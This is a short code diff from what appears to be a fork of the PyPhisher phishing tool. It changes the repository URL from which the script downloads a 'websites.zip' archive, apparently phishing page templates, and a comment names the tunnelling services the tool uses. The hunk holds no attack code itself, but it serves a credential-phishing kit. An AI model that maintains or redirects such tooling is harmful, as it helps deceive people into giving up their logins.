@@ -196,8 +196,8 @@ cprint = Console().print
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-repo_url = "https://github.com/KAR13MA09"
-websites_url = f"{repo_url}/releases/download/v{version[:3]}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
+repo_url = "https://github.com/KAR13MA09/NTTT"
+websites_url = f"{repo_url}/releases/download/v{version[:3]}/websites.zip" # "https://github.com/KAR13MA09/NTTT/releases/download/untagged-0e53955b0b0d3f0b02b6/websites.zip" 
 
 # CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun
 
